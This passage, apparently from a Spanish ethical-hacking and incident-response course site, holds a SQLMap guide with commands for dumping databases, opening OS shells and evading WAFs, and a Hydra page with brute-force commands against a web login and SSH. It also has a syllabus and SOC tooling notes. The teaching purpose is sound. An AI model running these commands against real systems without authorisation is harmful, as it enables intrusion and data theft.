para diferentes tipos de bases de datos.\n\n\n3. Conceptos b√°sicos\n3.1 Inyecci√≥n SQL: Repaso r√°pido\n\nT√©cnica de ataque que explota vulnerabilidades en aplicaciones web.\nPermite ejecutar comandos SQL maliciosos en una base de datos.\nEjemplo b√°sico:\n\nSELECT * FROM users WHERE id = &#039;1&#039; OR &#039;1&#039;=&#039;1&#039;;\n3.2 ¬øC√≥mo encaja SQLMap?\n\nAutomatiza la detecci√≥n de puntos de inyecci√≥n.\nExtrae datos (usuarios, tablas, contrase√±as) sin escribir consultas manualmente.\nReduce el tiempo y esfuerzo en pruebas de seguridad.\n\n\n4. T√©cnicas de Inyecci√≥n SQL\n\nInyecciones basadas en booleanos: Se utilizan para determinar si una condici√≥n es verdadera o falsa.\nInyecciones basadas en errores: Se aprovechan los mensajes de error de la base de datos para obtener informaci√≥n.\nInyecciones basadas en tiempo: Se miden los tiempos de respuesta del servidor para inferir informaci√≥n.\nInyecciones UNION: Se combina una consulta maliciosa con una consulta v√°lida para extraer datos.\nInyecciones apiladas: Se ejecutan m√∫ltiples consultas SQL separadas por punto y coma.\nOut-of-band: Se usa para cuando no hay manera de obtener los resultados por el mismo canal.\n\n\n5. Instalaci√≥n y requisitos\n5.1 Requisitos previos\n\nSistema operativo: Linux, Windows o macOS. 1\nPython instalado (versi√≥n compatible con SQLMap).\nDescarga desde el repositorio oficial:\n\ngit clone github.com/sqlmapproject/sqlmap.git\n5.2 Instalaci√≥n b√°sica\n\nClonar el repositorio o descargar el archivo ZIP.\nNavegar al directorio: cd sqlmap.\nEjecutar: python sqlmap.py -h para verificar.\n\n\n6. Uso b√°sico de SQLMap\n6.1 Sintaxis general\n\nComando base: python sqlmap.py -u &quot;URL&quot; [opciones].\nEjemplo: python sqlmap.py -u &quot;example.com/page\n\n6.2 Opciones comunes\n\n-hh: Para obtener todas las opciones posibles.\n-u: Especifica la URL objetivo.\n--dbs: Enumera las bases de datos disponibles.\n--tables: Lista las tablas de una base de datos.\n--dump: Extrae los datos de una tabla.\n--schema: permite obtener informaci√≥n sobre la estructura de la base de datos, como bases de datos, tablas, columnas.\n\n\n6.3 Ejemplos pr√°cticos:\n# Lista de bases de datos detectadas (ej. `information_schema`, `usuarios`)\npython sqlmap.py -u &quot;example.com/page --dbs\n \n# Enumerar tablas\nsqlmap -u &quot;ejemplo.com/pagina.php -D &lt;nombre_bd&gt; --tables\n \n# Enumerar columnas\nsqlmap -u &quot;ejemplo.com/pagina.php -D &lt;nombre_bd&gt; -T &lt;nombre_tabla&gt; --columns\n \n# Extraer datos\nsqlmap -u &quot;ejemplo.com/pagina.php -D &lt;nombre_bd&gt; -T &lt;nombre_tabla&gt; -C &lt;columna1,columna2&gt; --dump\n\n7. Funcionalidades avanzadas\n7.1 Detecci√≥n autom√°tica\n\n--level: Nivel de profundidad en las pruebas (1-5).\n--risk: Nivel de riesgo en las pruebas (1-3).\n\n\n7.2 Extracci√≥n de datos\n\n--dump-all: Descarga toda la base de datos.\n--sql-shell: Abre una shell SQL interactiva.\n--os-shell: Obtener una shell del sistema operativo.\n-r: Cargar una petici√≥n HTTP desde un archivo.\n--data: Enviar datos POST.\n--cookie: Especificar cookies.\n--proxy: Utilizar un proxy.\n--batch: Modo autom√°tico.\n-p: indica el par√°metro que es vulnerable\n--technique: indica la t√©cnica a emplear, por ejemplo, inyecciones basadas en booleanos (B) o usar UNION (U).\n\n\n7.3 Ejemplos complejos\n\nLas siguientes peticiciones usamos sqlmap con una request capturada. La request se puede obtener con burp suite u OWASP Zap, haciendo clic derecho y descargando la request.\nUno de los problemas que nos podemos encontrar con SQLMap es que tengamos que ignorar ciertos c√≥digos de error, como el 401.\nA veces sucede que corta la salida de texto cuando son muchos datos a devolver. Para evitarlo se usa --no-cast y --no-escape.\nLa opci√≥n --flush se utiliza para forzar la salida inmediata de los resultados de cada consulta SQL ejecutada por la herramienta.\n\nsqlmap -r req.txt --ignore-code=401 --dbms=sqlite --level=5 --risk=3 --technique=B -T &lt;table&gt; --columns\n \nsqlmap -u http://URL?q= --dbms=sqlite --level 5 --risk 3 --schema --no-cast --no-escape\n \nsqlmap -u &#039;http://URL?q=test&#039; -p &#039;q&#039; --dbms=&quot;sqlite&quot; --technique U --prefix &quot;&#039;)) &quot; --level 5 --risk 3 --dump-all --no-cast --no-escape --flush\n\n7.4 Evasi√≥n de seguridad\n\n--tamper: Usa scripts para evadir WAFs o filtros.\n\n# Ejemplo\npython sqlmap.py -u &quot;URL&quot; --tamper=space2comment\n\n8. Demostraci√≥n en vivo\n8.1 Escenario\n\nConfigurar un entorno vulnerable con DVWA github.com/digininja/DVWA\nEjecutar:\n\nsqlmap.py -u &quot;http://localhost/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot; --dbs\n\nMostrar resultados en pantalla.\n\n\n9. Mejores pr√°cticas y √©tica\n9.1 Uso responsable\n\nSQLMap, al igual que el resto de herramientas de hacking √©tico, solo se debe usar en entornos de prueba o con permiso expl√≠cito.\n\n9.2 Limitaciones de SQLMap\n\nNo reemplaza el an√°lisis manual.\nPuede generar falsos positivos o negativos.\nDepende de la configuraci√≥n del objetivo.\n\n\n10. Conclusi√≥n\n10.1 Resumen\n\nSQLMap es una herramienta poderosa para pruebas de inyecci√≥n SQL.\nF√°cil de usar, pero requiere conocimientos b√°sicos de SQL y seguridad.\nIdeal para aprender y practicar pentesting √©tico.\n\n10.2 Documentaci√≥n\n\nDocumentaci√≥n oficial de SQLMap: sqlmap.org/\n\nFootnotes\n\n\nEn kali linux ya viene instalado. ‚Ü©\n\n\n"},"ceti/Hacking-√©tico/RA-5/gu√≠as/hydra":{"title":"hydra","links":[],"tags":[],"content":"Hydra\nEjemplo de ruptura de login web\nhydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.57.109 http-post-form &quot;/login:username=^USER^&amp;password=^PASS^:F=incorrect&quot; -V\n\nRuptura de SSH\nhydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.57.109 ssh\n"},"ceti/Hacking-√©tico/Temario":{"title":"Temario","links":["ceti/Hacking-√©tico/RA-1/1a---Elementos-esenciales-del-hacking-√©tico","ceti/Hacking-√©tico/RA-1/1b---Conceptos-√©ticos-y-legales","ceti/Hacking-√©tico/RA-1/1c---Alcance-y-condiciones-de-un-pentest","ceti/Hacking-√©tico/RA-1/1d---Principios-de-seguridad","ceti/Hacking-√©tico/RA-1/1e---Fases-del-hacking","ceti/Hacking-√©tico/RA-1/1f---An√°lisis-de-vulnerabilidades","ceti/Hacking-√©tico/RA-1/1g---An√°lisis-de-tipos-de-ataques","ceti/Hacking-√©tico/RA-1/1h---Caracterizaci√≥n-de-vulnerabilidades","ceti/Hacking-√©tico/RA-1/1i---Herramientas-de-monitorizaci√≥n-y-hacking","ceti/Hacking-√©tico/RA-2/2a---Funcionamiento-de-las-tarjetas-de-red-inal√°mbricas","ceti/Hacking-√©tico/RA-2/2b---Comunicaci√≥n-de-redes-inal√°mbricas","ceti/Hacking-√©tico/RA-2/2c---Captura-de-tr√°fico-de-redes-inal√°mbricas","ceti/Hacking-√©tico/RA-2/2d---Ataques-y-exploraci√≥n-de-redes-inal√°mbricas","ceti/Hacking-√©tico/RA-2/2e---Ataques-a-otros-sistemas-inal√°mbricos","ceti/Hacking-√©tico/RA-2/2f---Equipo-rojo-vs-azul","ceti/Hacking-√©tico/RA-2/2g---Realizaci√≥n-de-informes-de-auditor√≠a","ceti/Hacking-√©tico/RA-3/3a---Escaneo-pasivo-(footprinting)","ceti/Hacking-√©tico/RA-3/3b---Escaneo-activo-(fingerprinting)","ceti/Hacking-√©tico/RA-3/3c---Monitorizaci√≥n-e-interceptaci√≥n-de-tr√°fico-de-red","ceti/Hacking-√©tico/RA-3/3d---Ataque-de-intermediario-(Man-in-the-Middle)","ceti/Hacking-√©tico/RA-3/3e---Comprometer-sistemas-remotos","ceti/Hacking-√©tico/RA-4/4a---Administraci√≥n-de-sistemas-de-manera-remota","ceti/Hacking-√©tico/RA-4/4b---Ataques-y-auditor√≠as-de-contrase√±as","ceti/Hacking-√©tico/RA-4/4c---Pivotaje-a-trav√©s-de-sistemas-comprometidos","ceti/Hacking-√©tico/RA-4/4d---Instalaci√≥n-de-puertas-traseras","ceti/Hacking-√©tico/RA-5/5a---Autenticaci√≥n-web","ceti/Hacking-√©tico/RA-5/5b---Recolecci√≥n-de-informaci√≥n-web","ceti/Hacking-√©tico/RA-5/5c---An√°lisis-de-interacciones-con-aplicaciones-web","ceti/Hacking-√©tico/RA-5/5d---B√∫squeda-manual-de-vulnerabilidades-web","ceti/Hacking-√©tico/RA-5/5e---Herramientas-de-b√∫squeda-de-vulnerabilidades-web","ceti/Hacking-√©tico/RA-5/5f---Herramientas-de-explotaci√≥n-de-vulnerabilidades-web"],"tags":["Apuntes","Temas","Hacking"],"content":"Desglose del temario HE: RA - Criterios - Contenidos\nRA 1. Determina herramientas de monitorizaci√≥n para detectar vulnerabilidades aplicando t√©cnicas de hacking √©tico.\nCriterios de evaluaci√≥n:\na) Se ha definido la terminolog√≠a esencial del hacking √©tico.\n\nContenido asociado: Elementos esenciales del hacking √©tico.\nEnlace con el material para impartirlo: 1a - Elementos esenciales del hacking √©tico\n\nb) Se han identificado los conceptos √©ticos y legales frente al ciberdelito.\n\nContenido asociado: Diferencias entre hacking, hacking √©tico, tests de penetraci√≥n y hacktivismo.\nEnlace con el material para impartirlo: 1b - Conceptos √©ticos y legales\n\nc) Se ha definido el alcance y condiciones de un test de intrusi√≥n.\n\nContenido asociado: Recolecci√≥n de permisos y autorizaciones previos a un test de intrusi√≥n.\nEnlace con el material para impartirlo: 1c - Alcance y condiciones de un pentest\n\nd) Se han identificado los elementos esenciales de seguridad: confidencialidad, autenticidad, integridad y disponibilidad.\n\nContenido asociado: Auditor√≠as de caja negra y de caja blanca.\nEnlace con el material para impartirlo: 1d - Principios de seguridad\n\ne) Se han identificado las fases de un ataque seguidas por un atacante.\n\nContenido asociado: Fases del hacking.\nEnlace con material para impartirlo: 1e - Fases del hacking\n\nf) Se han analizado y definido los tipos vulnerabilidades.\n\nContenido asociado: Documentaci√≥n de vulnerabilidades.\nEnlace con el material para impartirlo: 1f - An√°lisis de vulnerabilidades\n\ng) Se han analizado y definido los tipos de ataque.\n\nContenido asociado: ClearNet, Deep Web, Dark Web, Darknets. Conocimiento, diferencias y herramientas de acceso: Tor. ZeroNet, FreeNet.\nEnlace con el material para impartirlo: 1g - An√°lisis de tipos de ataques\n\nh) Se han determinado y caracterizado las diferentes vulnerabilidades existentes.\n\nEnlace con el material para impartirlo: 1h - Caracterizaci√≥n de vulnerabilidades\n\ni) Se han determinado las herramientas de monitorizaci√≥n disponibles en el mercado adecuadas en funci√≥n del tipo de organizaci√≥n.\n\nContenido asociado: Clasificaci√≥n de herramientas de seguridad y hacking.\nEnlace con el material para impartirlo: 1i - Herramientas de monitorizaci√≥n y hacking\n\nRA 2. Ataca y defiende en entornos de prueba, comunicaciones inal√°mbricas consiguiendo acceso a redes para demostrar sus vulnerabilidades.\nCriterios de evaluaci√≥n:\na) Se han configurado los distintos modos de funcionamiento de las tarjetas de red inal√°mbricas.\n\nContenido asociado: Modo infraestructura, ad-hoc y monitor.\nEnlace con el material para impartirlo: 2a - Funcionamiento de las tarjetas de red inal√°mbricas\n\nb) Se han descrito las t√©cnicas de encriptaci√≥n de las redes inal√°mbricas y sus puntos vulnerables.\n\nContenido asociado: Comunicaci√≥n inal√°mbrica.\nEnlace con el material para impartirlo: 2b - Comunicaci√≥n de redes inal√°mbricas\n\nc) Se han detectado redes inal√°mbricas y se ha capturado tr√°fico de red como paso previo a su ataque.\n\nContenido asociado: An√°lisis y recolecci√≥n de datos en redes inal√°mbricas.\nEnlace con el material para impartirlo: 2c - Captura de tr√°fico de redes inal√°mbricas\n\nd) Se ha accedido a redes inal√°mbricas vulnerables.\n\nContenido asociado: T√©cnicas de ataques y exploraci√≥n de redes inal√°mbricas.\nEnlace con el material para impartirlo: 2d - Ataques y exploraci√≥n de redes inal√°mbricas\n\ne) Se han caracterizado otros sistemas de comunicaci√≥n inal√°mbricos y sus vulnerabilidades.\n\nContenido asociado: Ataques a otros sistemas inal√°mbricos.\nEnlace con el material para impartirlo: 2e - Ataques a otros sistemas inal√°mbricos\n\nf) Se han utilizado t√©cnicas de ‚ÄúEquipo Rojo y Azul‚Äù.\n\nEnlace con el material para impartirlo: 2f - Equipo rojo vs azul\n\ng) Se han realizado informes sobre las vulnerabilidades detectadas.\n\nContenido asociado: Realizaci√≥n de informes de auditor√≠a y presentaci√≥n de resultados.\nEnlace con el material para impartirlo: 2g - Realizaci√≥n de informes de auditor√≠a\n\nRA 3. Ataca y defiende en entornos de prueba, redes y sistemas consiguiendo acceso a informaci√≥n y sistemas de terceros.\nCriterios de evaluaci√≥n:\na) Se ha recopilado informaci√≥n sobre la red y sistemas objetivo mediante t√©cnicas pasivas.\n\nContenido asociado: Fase de reconocimiento (footprinting).\nEnlace con el material para impartirlo: 3a - Escaneo pasivo (footprinting)\n\nb) Se ha creado un inventario de equipos, cuentas de usuario y potenciales vulnerabilidades de la red y sistemas objetivo mediante t√©cnicas activas.\n\nContenido asociado: Fase de escaneo (fingerprinting).\nEnlace con el material para impartirlo: 3b - Escaneo activo (fingerprinting)\n\nc) Se ha interceptado tr√°fico de red de terceros para buscar informaci√≥n sensible.\n\nContenido asociado: Monitorizacion de tr√°fico.\nContenido asociado: Interceptaci√≥n de comunicaciones utilizando distintas t√©cnicas.\nEnlace con el material para impartirlo: 3c - Monitorizaci√≥n e interceptaci√≥n de tr√°fico de red\n\nd) Se ha realizado un ataque de intermediario, leyendo, insertando y modificando, a voluntad, el tr√°fico intercambiado por dos extremos remotos.\n\nContenido asociado: Manipulaci√≥n e inyecci√≥n de tr√°fico.\nEnlace con el material para impartirlo: 3d - Ataque de intermediario (Man in the Middle)\n\ne) Se han comprometido sistemas remotos explotando sus vulnerabilidades.\n\nContenido asociado: Herramientas de b√∫squeda y explotaci√≥n de vulnerabilidades.\nContenido asociado: Ingenier√≠a social. Phising.\nContenido asociado: Escalada de privilegios.\nEnlace con el material para impartirlo: 3e - Comprometer sistemas remotos\n\nRA 4. Consolida y utiliza sistemas comprometidos garantizando accesos futuros.\nCriterios de evaluaci√≥n:\na) Se han administrado sistemas remotos a trav√©s de herramientas de l√≠nea de comandos.\n\nContenido asociado: Administraci√≥n de sistemas de manera remota.\nEnlace con el material para impartirlo: 4a - Administraci√≥n de sistemas de manera remota\n\nb) Se han comprometido contrase√±as a trav√©s de ataques de diccionario, tablas rainbow y fuerza bruta contra sus versiones encriptadas.\n\nContenido asociado: Ataques y auditor√≠as de contrase√±as.\nEnlace con el material para impartirlo: 4b - Ataques y auditor√≠as de contrase√±as\n\nc) Se ha accedido a sistemas adicionales a trav√©s de sistemas comprometidos.\n\nContenido asociado: Pivotaje en la red.\nEnlace con el material para impartirlo: 4c - Pivotaje a trav√©s de sistemas comprometidos\n\nd) Se han instalado puertas traseras para garantizar accesos futuros a los sistemas comprometidos.\n\nContenido asociado: Instalaci√≥n de puertas traseras con troyanos (RAT, Remote Access Trojan).\nEnlace con el material para impartirlo: 4d - Instalaci√≥n de puertas traseras\n\nRA 5. Ataca y defiende en entornos de prueba, aplicaciones web consiguiendo acceso a datos o funcionalidades no autorizadas.\nCriterios de evaluaci√≥n:\na) Se han identificado los distintos sistemas de autenticaci√≥n web, destacando sus debilidades y fortalezas.\n\nContenido asociado: Negaci√≥n de credenciales en aplicaciones web.\nEnlace con el material para impartirlo: 5a - Autenticaci√≥n web\n\nb) Se ha realizado un inventario de equipos, protocolos, servicios y sistemas operativos que proporcionan el servicio de una aplicaci√≥n web.\n\nContenido asociado: Recolecci√≥n de informaci√≥n.\nEnlace con el material para impartirlo: 5b - Recolecci√≥n de informaci√≥n web\n\nc) Se ha analizado el flujo de las interacciones realizadas entre el navegador y la aplicaci√≥n web durante su uso normal.\n\nContenido asociado: Automatizaci√≥n de conexiones a servidores web (ejemplo: Selenium).\nContenido asociado: An√°lisis de tr√°fico a trav√©s de proxies de intercepci√≥n.\nEnlace con el material para impartirlo: 5c - An√°lisis de interacciones con aplicaciones web\n\nd) Se han examinado manualmente aplicaciones web en busca de las vulnerabilidades m√°s habituales.\n\nContenido asociado: B√∫squeda de vulnerabilidades habituales en aplicaciones web.\nEnlace con el material para impartiro: 5d - B√∫squeda manual de vulnerabilidades web\n\ne) Se han usado herramientas de b√∫squedas y explotaci√≥n de vulnerabilidades web.\n\nContenido asociado: Herramientas para la explotaci√≥n de vulnerabilidades web.\nEnlace con el material para impartirlo: 5e - Herramientas de b√∫squeda de vulnerabilidades web\n\nf) Se ha realizado la b√∫squeda y explotaci√≥n de vulnerabilidades web mediante herramientas software.\n\nEnlace con el material para impartirlo: 5f - Herramientas de explotaci√≥n de vulnerabilidades web\n"},"ceti/Hacking-√©tico/index":{"title":"Hacking √©tico","links":["ceti/Hacking-√©tico/Temario"],"tags":[],"content":"Hacking √©tico es un m√≥dulo del curso de especializaci√≥n en ciberseguridad en entornos de las tecnolog√≠as de la informaci√≥n (CETI). En esta documentaci√≥n pretendo realizar una sugerencia de contenidos que se pueden impartir en cada uno de los resultados de aprendizaje esperados.\nTodo el temario analizado en el siguiente enlace:\n\nTemario\n\nWebs para practicar pentesting:\n\nGenerales\n\nTryHackMe: tryhackme.com/\nHackTheBox: www.hackthebox.com/\nPwned Labs: pwnedlabs.io/\nctftime.org/\nwww.cybrary.it/\n\n\nWeb\n\noverthewire.org/wargames/\nginandjuice.shop/\n\n\nPor retos\n\nAtenea (CCN-CERT)\nAcademia hacker de Incibe\n\n\nCertificaciones interesantes:\n\neJPT\nOSCP\nNo recomendada: CEH (aunque suele aparecer en infojobs)\n\n\nDistribuciones\n\nKali Linux (probar Kaboxer)\nParrotOS\n\n\n\nMateriales en general:\n\ninventory.raw.pm/overview.html\ngithub.com/bst04/CyberSources\ns0cm0nkey.gitbook.io/s0cm0nkeys-security-reference-guide/blue-defense/event-detection#nsm-network-security-monitoring\nApuntes de otros compa√±eros:\n\ngithub.com/JagMolar/CETI/tree/master/Hacking%20%C3%A9tico\n\n\n"},"ceti/Incidentes-de-ciberseguridad/RA-1/1a---Principios-generales-en-materia-de-ciberseguridad":{"title":"1a - Principios generales en materia de ciberseguridad","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\na) Se han definido los principios generales de la organizaci√≥n en materia de ciberseguridad, que deben ser conocidos y apoyados por la direcci√≥n de la misma.\n\nContenido asociado: Principios generales en materia de ciberseguridad.\n\nPr√°cticas sugeridas\n\ntryhackme.com/r/room/careersincyber\ntryhackme.com/r/room/securityprinciples\ntryhackme.com/room/introtoirandim\n\nConceptos generales\n\nCIA triad: confidencialidad, integridad y disponibilidad\nCIA triad extended: a√±ade autenticidad y no repudio\n\nGlosario de t√©rminos\n\nINCIBE: www.incibe.es/sites/default/files/contenidos/guias/doc/guia_glosario_ciberseguridad_2021.pdf\n\nFrameworks de ciberseguridad\n\nNIST: nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.1299.spa.pdf\n\nFrameworks de respuesta a incidentes\n\nNIST: nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r3.pdf\nNIST (esta gu√≠a es anterior, pero se referencia debido a la parte final de preguntas y respuestas): educacionadistancia.juntadeandalucia.es/profesorado/pluginfile.php/1633510/mod_resource/content/0/NIST.SP.800-61r2.pdf\nSANS: www.sans.org/white-papers/33901/\nIncibe\nEsquema nacional de seguridad\n"},"ceti/Incidentes-de-ciberseguridad/RA-1/1b---Normativa-de-protecci√≥n-del-puesto-del-trabajo.":{"title":"1b - Normativa de protecci√≥n del puesto del trabajo.","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nb) Se ha establecido una normativa de protecci√≥n del puesto de trabajo.\n\nContenido asociado: Normativa de protecci√≥n del puesto del trabajo.\n\nMateriales apoyo\n\nBuenas pr√°cticas CCN-CERT: www.ccn-cert.cni.es/es/informes/informes-de-buenas-practicas-bp/2473-ccn-cert-bp-01-principios-y-recomendaciones-basicas-en-ciberseguridad/file.html\n\nPr√°cticas sugeridas"},"ceti/Incidentes-de-ciberseguridad/RA-1/1c---Plan-de-formaci√≥n-y-concienciaci√≥n-en-materia-de-ciberseguridad":{"title":"1c - Plan de formaci√≥n y concienciaci√≥n en materia de ciberseguridad","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nc) Se ha definido un plan de concienciaci√≥n de ciberseguridad dirigido a los empleados.\n\nContenido asociado: Plan de formaci√≥n y concienciaci√≥n en materia de ciberseguridad.\n\nMateriales de apoyo\n\nIncibe - Gu√≠a de ciberataques: www.incibe.es/ciudadania/formacion/guias/guia-de-ciberataques\nIncibe - ciberamenazas contra entornos empresariales: www.incibe.es/sites/default/files/contenidos/guias/doc/ciberamenazas_contra_entornos_empresariales.pdf\nHay multitud de documentos de buenas pr√°cticas del CCN-CERT: www.ccn-cert.cni.es/es/informes/informes-de-buenas-practicas-bp.html\nwww.incibe.es/empresas/formacion/kit-concienciacion\nwww.incibe.es/ciudadania/tematicas\nwww.incibe.es/aprendeciberseguridad\nnationalprivacytest.org/es\n\nPr√°cticas sugeridas\nHerramientas\n\nPhishing\n\nGophish getgophish.com/\nZphiser github.com/htr-tech/zphisher\n\n\n"},"ceti/Incidentes-de-ciberseguridad/RA-1/1d---Materiales-de-formaci√≥n-y-concienciaci√≥n":{"title":"1d - Materiales de formaci√≥n y concienciaci√≥n","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nd) Se ha desarrollado el material necesario para llevar a cabo las acciones de concienciaci√≥n dirigidas a los empleados.\n\nContenido asociado: Materiales de formaci√≥n y concienciaci√≥n.\n\nMateriales de apoyo\n\nwww.incibe.es/empresas/formacion/kit-concienciacion\n\nPr√°cticas sugeridas\nHerramientas\n\nCanva (para la creaci√≥n de carteles, gratis para docentes g.educaand.es): www.canva.com/es_es/\n"},"ceti/Incidentes-de-ciberseguridad/RA-1/1e---Auditor√≠as-internas-de-cumplimiento-en-materia-de-prevenci√≥n":{"title":"1e - Auditor√≠as internas de cumplimiento en materia de prevenci√≥n","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\ne) Se ha realizado una auditor√≠a para verificar el cumplimiento del plan de prevenci√≥n y concienciaci√≥n de la organizaci√≥n.\n\nContenido asociado: Auditor√≠as internas de cumplimiento en materia de prevenci√≥n\n\nMateriales\n\nIncibe - checklist auditor√≠a pymes: www.incibe.es/sites/default/files/contenidos/politicas/documentos/auditoria-sistemas.pdf\nIncibe - auditoria de sistemas: www.incibe.es/empresas/blog/has-revisado-tu-nivel-seguridad-utiliza-las-auditorias-sistemas\n\nPr√°cticas sugeridas"},"ceti/Incidentes-de-ciberseguridad/RA-2/2a---Taxonom√≠a-de-incidentes-de-ciberseguridad":{"title":"2a - Taxonom√≠a de incidentes de ciberseguridad","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\na) Se ha clasificado y definido la taxonom√≠a de incidentes de ciberseguridad que pueden afectar a la organizaci√≥n.\n\nContenido asociado: Taxonom√≠a de incidentes de ciberseguridad.\n\nMateriales de apoyo\nLos siguientes materiales son amplios, lo que hay que trabajar aqu√≠ es exclusivamente la divisi√≥n en categor√≠as y subcategor√≠as de los distintos tipos de incidentes de ciberseguridad:\n\nGithub con la taxonom√≠a de ENISA: github.com/enisaeu/Reference-Security-Incident-Taxonomy-Task-Force/blob/034cea9442ca2f704d06311bc76a6637bef8e6cb/working_copy/humanv1.md\nIncibe - gu√≠a nacional de notificaci√≥n y gesti√≥n de incidentes: www.incibe.es/sites/default/files/contenidos/guias/doc/guia_nacional_notificacion_gestion_ciberincidentes.pdf\nENS - Gesti√≥n de ciberincidentes: www.ccn-cert.cni.es/es/series-ccn-stic/800-guia-esquema-nacional-de-seguridad/988-ccn-stic-817-gestion-de-ciberincidentes/file\n"},"ceti/Incidentes-de-ciberseguridad/RA-2/2b---Monitorizaci√≥n,-identificaci√≥n,-detecci√≥n-y-alerta-de-incidentes":{"title":"2b - Monitorizaci√≥n, identificaci√≥n, detecci√≥n y alerta de incidentes","links":["ceti/Incidentes-de-ciberseguridad/RA-2/gu√≠as/Wazuh","ceti/Incidentes-de-ciberseguridad/RA-2/gu√≠as/Suricata"],"tags":[],"content":"Criterio de evaluaci√≥n\nb) Se han establecido controles, herramientas y mecanismos de monitorizaci√≥n, identificaci√≥n, detecci√≥n y alerta de incidentes\n\nContenido asociado: Controles, herramientas y mecanismos de monitorizaci√≥n, identificaci√≥n, detecci√≥n y alerta de incidentes: tipos y fuentes\n\nMaterial de apoyo\n\nIncibe: www.incibe.es/sites/default/files/contenidos/guias/doc/certsi_diseno_configuracion_ips_ids_siem_en_sci.pdf\n\nAqu√≠ se puede hablar de las herramientas de tipo:\n\nSIEM: ELK, Splunk o QRadar.\nEDR: Wazuh, Microsoft SentinelOne o CrowdStrike.\nNIDS/NIPS: Snort o Suricata\nHIDS/HIPS: OSSEC (incluido en Wazuh) o Fleet (incluye OSQuery)\nBehavioral Network Analyzer: Zeek\nSOAR: Catalyst\nFirewall: IPTables o NFTables\nNDR (Network Detection and Response): Zeek, Snort, Suricata, Arkime (github.com/arkime/arkime)\nHoneypots:\n\nElementos de blue team\n\nHoneypots\nIAM\n"},"ceti/Incidentes-de-ciberseguridad/RA-2/2c---Detecci√≥n-e-identificaci√≥n-de-incidentes-de-seguridad-f√≠sica":{"title":"2c - Detecci√≥n e identificaci√≥n de incidentes de seguridad f√≠sica","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nc) Se han establecido controles y mecanismos de detecci√≥n e identificaci√≥n de incidentes de seguridad f√≠sica.\n\nContenido asociado: Controles, herramientas y mecanismos de detecci√≥n e identificaci√≥n de incidentes de seguridad f√≠sica.\n\nMaterial de apoyo\n\nwww.iso27000.es/iso27002_11.html\n\nConceptos\n\nDiagramas de controles de acceso f√≠sico.\nDiscusi√≥n de tecnolog√≠as (tarjetas RFID, biometr√≠a).\nAn√°lisis de videos de CCTV simulados o de casos reales (si es apropiado).\nChecklists de inspecci√≥n f√≠sica.\n"},"ceti/Incidentes-de-ciberseguridad/RA-2/2d---Monitorizaci√≥n,-identificaci√≥n,-detecci√≥n-y-alerta-de-incidentes-a-trav√©s-de-OSINT":{"title":"2d - Monitorizaci√≥n, identificaci√≥n, detecci√≥n y alerta de incidentes a trav√©s de OSINT","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\nd) Se han establecido controles, herramientas y mecanismos de monitorizaci√≥n, identificaci√≥n, detecci√≥n y alerta de incidentes a trav√©s de la investigaci√≥n en fuentes abiertas (OSINT: Open Source Intelligence).\n\nContenido asociado: Controles, herramientas y mecanismos de monitorizaci√≥n, identificaci√≥n, detecci√≥n y alerta de incidentes a trav√©s de la investigaci√≥n en fuentes abiertas (OSINT).\n\nMaterial de apoyo\n\nIncibe: www.incibe.es/incibe-cert/blog/osint-la-informacion-es-poder\n\nHerramientas\n\nMotores de b√∫squeda avanzada (Google Dorking).\n\nwww.exploit-db.com/google-hacking-database\n\n\nShodan.io (para buscar dispositivos conectados).\nMaltego (Community Edition).\ntheHarvester.\nOSINT Framework: osintframework.com/\nRedes sociales\n\ngithub.com/sherlock-project/sherlock\n\n\nWayback Machine.\nLeaks\n\ngithub.com/ail-project/ail-framework\ngithub.com/ail-project/lacus\n\n\nDark web\n\ngithub.com/s-rah/onionscan\ngithub.com/DedSecInside/TorBot\n\n\nArt√≠culos\n\nderechodelared.com/herramientas-osint-recopilatorio/\n\n\n"},"ceti/Incidentes-de-ciberseguridad/RA-2/2e---Clasificaci√≥n,-valoraci√≥n,-documentaci√≥n,-seguimiento-inicial-de-incidentes-de-ciberseguridad":{"title":"2e - Clasificaci√≥n, valoraci√≥n, documentaci√≥n, seguimiento inicial de incidentes de ciberseguridad","links":[],"tags":[],"content":"Criterio de evaluaci√≥n:\ne) Se ha realizado una clasificaci√≥n, valoraci√≥n, documentaci√≥n y seguimiento de los incidentes detectados dentro de la organizaci√≥n.\n\nContenido asociado: Clasificaci√≥n, valoraci√≥n, documentaci√≥n, seguimiento inicial de incidentes de ciberseguridad.\n\nMaterial de apoyo:\n\nIncibe - gu√≠a nacional notificaci√≥n y gesti√≥n ciberincidentes (peligrosidad e impacto): www.incibe.es/sites/default/files/contenidos/guias/doc/guia_nacional_notificacion_gestion_ciberincidentes.pdf\nENS: www.ccn-cert.cni.es/es/series-ccn-stic/800-guia-esquema-nacional-de-seguridad/988-ccn-stic-817-gestion-de-ciberincidentes/file\nPlantillas de informes de incidentes\n\nHerramientas\n\nSIRP (en orden de relevancia):\n\nTheHive: github.com/TheHive-Project/TheHive\nDFIR-Iris: github.com/dfir-iris/iris-web\nFIR (Fast incident response): github.com/certsocietegenerale/FIR\nDFIR-Track: github.com/dfirtrack/dfirtrack\nCatalyst (catalyst.security-brewery.com/)\n\n\nTicketing gen√©ricas (JIRA)\n\nConceptos\n\nIOC\nTLP (Traffic Light Protocol)\n\nwww.first.org/tlp/\nwww.incibe.es/incibe-cert/sobre-incibe-cert/TLP\n\n\nPAP\nSeverity (peligrosidad e impacto)\n"},"ceti/Incidentes-de-ciberseguridad/RA-2/Herramientas-de-un-SOC":{"title":"Herramientas de un SOC","links":[],"tags":[],"content":"Herramientas de un SOC\nSIEM\nEl siem es una herramienta de monitorizaci√≥n.\n\nELK\nSplunk\nQRadar\n\nEDR\n\nWazuh\nMicrosoft SentinelOne\n\nNetworkd IDS/IPS\n\nSnort\nSuricata\n\nHost IDS/IPS\n\nOSSEC\nFleet + OSQuery\n\nBehavioral Network Analyzer\n\nZeek (antiguo 